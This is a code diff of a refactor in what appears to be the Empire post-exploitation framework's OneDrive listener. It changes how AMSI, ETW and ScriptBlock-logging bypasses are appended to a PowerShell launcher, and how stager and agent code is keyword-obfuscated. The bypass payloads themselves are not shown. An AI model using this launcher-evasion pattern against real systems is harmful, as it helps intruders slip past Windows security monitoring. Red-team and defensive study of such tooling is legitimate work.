@@ -9,15 +9,14 @@ import time
 import traceback
 from builtins import object
 from builtins import str
-from datetime import datetime
+from typing import List
 
 from pydispatch import dispatcher
 from requests import Request, Session
 
-from empire.server.common import bypasses
 from empire.server.common import encryption
-# Empire imports
 from empire.server.common import helpers
+from empire.server.utils import data_util
 
 
 class Listener(object):
@@ -137,7 +136,7 @@ class Listener(object):
         self.mainMenu = mainMenu
         self.threads = {}
 
-        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
+        self.options['StagingKey']['Value'] = str(data_util.get_config('staging_key')[0])
 
     def default_response(self):
         return ''
@@ -170,7 +169,9 @@ class Listener(object):
 
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
-                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
+                          listenerName=None, bypasses: List[str]=None):
+        bypasses = [] if bypasses is None else bypasses
+
         if not language:
             print(helpers.color("[!] listeners/onedrive generate_launcher(): No language specified"))
 
@@ -192,17 +193,8 @@ class Listener(object):
 
                 if safeChecks.lower() == 'true':
                     launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-                    # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        launcher += bypasses.scriptBlockLogBypass()
-                    if ETWBypass:
-                        launcher += bypasses.ETWBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        launcher += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        launcher += bypasses.AMSIBypass2()
+                    for bypass in bypasses:
+                        launcher += bypass
                     launcher += "};"
                     launcher += helpers.randomize_capitalization(
                         "[System.Net.ServicePointManager]::Expect100Continue=0;")
@@ -291,7 +283,7 @@ class Listener(object):
             stager = f.read()
             f.close()
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = helpers.keyword_obfuscation(stager)
+            stager = data_util.keyword_obfuscation(stager)
 
             stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
             stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
@@ -466,7 +458,7 @@ class Listener(object):
             f.close()
 
 
-            agent_code = helpers.keyword_obfuscation(agent_code)
+            agent_code = data_util.keyword_obfuscation(agent_code)
 
             comms_code = self.generate_comms(listener_options, client_id, client_secret, token, refresh_token,
                                              redirect_uri, language)
